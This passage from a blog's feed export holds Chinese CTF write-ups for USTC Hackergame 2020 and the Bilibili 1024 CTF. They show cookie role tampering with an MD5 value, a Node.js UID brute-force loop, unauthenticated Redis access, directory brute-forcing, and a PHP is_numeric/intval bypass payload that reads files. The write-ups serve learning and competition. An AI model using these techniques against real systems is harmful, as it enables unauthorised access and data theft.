1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 